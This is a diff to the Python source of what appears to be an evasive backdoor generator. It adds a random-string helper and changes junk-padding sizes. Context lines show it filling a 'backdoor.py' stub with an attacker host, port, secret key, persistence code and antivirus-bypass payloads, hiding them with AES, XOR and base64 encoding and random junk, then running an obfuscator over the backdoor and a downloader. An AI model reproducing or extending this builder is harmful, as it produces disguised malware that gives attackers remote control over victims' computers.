@@ -20,6 +20,9 @@ import base64, random, string, sys, os, argparse, subprocess, requests
 def randKey(bytes):
 	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))
 
+def randStr(length):
+	return ''.join(random.choice(string.ascii_letters + string.digits) for x in range(length))
+
 def randVar():
 	if random.choice('IO') == 'I':
 		return random.choice('lIi') + ''.join(random.choice('lIi1') for x in range(random.randint(15,20)))
@@ -100,9 +103,9 @@ EncodeAES = lambda c, s: c.encrypt(pad(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, key2, iv, secretkey = randKey(32), randKey(32), randKey(16), randKey(32)
 be64var, bd64var, AESvar, envvar, urlvar, keyvar, junkvar = randVar(), randVar(), randVar(), randVar(), randVar(), randVar(), randVar()
-xoroffset = random.randint(500,10000)
-junk = junkvar + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(xoroffset)) + xorkey + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(500,5000))) + '"'
-junk2 = randVar() + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(10,25000))) + '"'
+xoroffset = random.randint(500,2500)
+junk = junkvar + ' = "' + randStr(xoroffset) + xorkey + randStr(random.randint(500,2000)) + '"'
+junk2 = randVar() + ' = "' + randStr(random.randint(1500,5000)) + '"'
 
 if args.persistence:
 	persistpart = '''
@@ -127,7 +130,7 @@ with open('stubs/backdoor.py', 'rb') as finalbackdoor:
 	readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', "funrot('" + frot(hostname) + "')").replace('***PORT***', "funrot('" + frot(portnumber) + "')").replace('***SECRET***', "funrot('" + frot(secretkey) + "')").replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***ENV***', envvar).replace('***B64E***',be64var).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2).replace('***XOR***', '%s[%s:%s]' % (junkvar, xoroffset, xoroffset + 1000)).replace('***URLO***', urlvar)
 with open('tempobfs.py', 'wb') as o:
 	o.write(readyscript)
-obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % randStr(random.randint(25,80)), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 readyscript = obstime.stdout.read()
 os.remove('tempobfs.py')
 
@@ -172,7 +175,7 @@ with open(dlf, 'rb') as dl:
 with open('tempobfs.py', 'wb') as o:
 	o.write(downloaderscript)
 
-obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % randStr(random.randint(25,80)), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 downloaderscript = obstime.stdout.read()
 os.remove('tempobfs.py')
 cipher = AES.new(key2)
